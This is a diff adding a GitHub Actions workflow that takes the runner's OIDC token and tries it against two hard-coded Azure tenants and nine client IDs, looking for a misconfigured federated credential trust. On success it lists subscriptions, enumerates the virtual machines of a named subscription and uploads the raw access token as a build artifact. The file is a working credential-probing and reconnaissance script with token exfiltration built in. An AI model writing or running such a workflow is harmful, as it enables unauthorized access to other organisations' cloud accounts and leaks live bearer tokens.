@@ -1,0 +1,69 @@
+name: ul8781
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  exh:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: exchange
+        run: |
+          set +e
+          echo "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF actor=$GITHUB_ACTOR"
+          O=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          OIDC=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          echo "oidc_len=${#OIDC}"
+          echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 600; echo
+          for TEN in e8adc959-bf67-48e0-95b4-318b5f73946c c3b32785-891b-4be9-90c2-c6d313ab4895; do
+          for CID in 032854b2-ba65-4dd6-bdd4-4e86b8756667 1459b1f6-7a5b-4300-93a2-44b4a651759f a1c42e17-82a8-41a5-906d-3eaca8b54607 abfa0a7c-a6b6-4736-8310-5855508787cd 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab f1996472-dd17-447c-bcdb-f8b76dd9b861 b9590f55-e173-495c-9010-15beb8611a43 25c1dc23-3925-49f1-94d3-4e702da5fa9b; do
+            R=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+              -d grant_type=client_credentials -d client_id=$CID \
+              -d scope=https://management.azure.com/.default \
+              -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+              --data-urlencode "client_assertion=$OIDC")
+            C=$(echo "$R" | grep -oE 'AADSTS[0-9]+' | head -1)
+            T=$(echo "$R" | python3 -c "import json,sys
+try: print(len(json.load(sys.stdin).get('access_token','')))
+except Exception: print(0)")
+            echo "RESULT ${TEN:0:8} $CID ${C:-NONE} tok=${T:-0}"
+            if [ "${T:-0}" -gt 100 ]; then
+              echo "$R" > tok.json
+              printf '%s\n' "$TEN $CID" > winner.txt
+            fi
+          done
+          done
+          if [ -f tok.json ]; then
+            echo "=== WINNER $(cat winner.txt)"
+            T=$(python3 -c "import json;print(json.load(open('tok.json'))['access_token'])")
+            curl -s -m 25 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions?api-version=2022-12-01" -o subs.json
+            python3 -c "
+import json
+d=json.load(open('subs.json'))
+for s in d.get('value',[]): print('SUB',s['subscriptionId'],s['displayName'],s['state'])
+" 2>/dev/null
+            curl -s -m 60 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&statusOnly=true" -o vms.json
+            python3 -c "
+import json
+d=json.load(open('vms.json'))
+vs=d.get('value',[])
+print('VMS',len(vs))
+print(json.dumps([{ 'n':v['name'],'loc':v['location'],'rg':v['id'].split('/resourceGroups/')[1].split('/')[0],'sz':(v['properties'].get('hardwareProfile') or {}).get('vmSize','')} for v in vs])[:1500])
+" 2>/dev/null
+          else
+            echo "NO_WINNER"
+          fi
+      - name: artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ul8781-exchange
+          path: |
+            tok.json
+            winner.txt
+            subs.json
+            vms.json
+          if-no-files-found: ignore
